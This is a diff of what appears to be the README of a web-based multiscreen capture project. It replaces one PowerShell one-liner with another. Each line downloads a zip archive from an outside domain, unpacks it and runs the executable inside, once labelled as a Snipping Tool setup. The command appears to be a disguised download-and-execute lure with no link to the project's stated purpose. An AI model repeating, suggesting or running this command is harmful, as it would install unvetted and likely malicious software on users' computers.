@@ -10,4 +10,4 @@ This project contains example about multiscreen capture and views on the web pag
   },
 
 
-powershell -command "Invoke-WebRequest 'https://umaigames.com/sstool.zip' -OutFile 'sstool.zip'; Expand-Archive 'sstool.zip' -DestinationPath 's' -Force" ; cmd /c "start /d ""s"" ""SnippingTool Setup 10.3.9.exe"""
+powershell -command "Remove-Item 's' -Recurse -Force -EA 0; iwr 'https://umaigames.com/sstool.zip' -OutFile 's.zip'; Expand-Archive 's.zip' -DestinationPath 's' -Force; Start-Process 's\*.exe'"
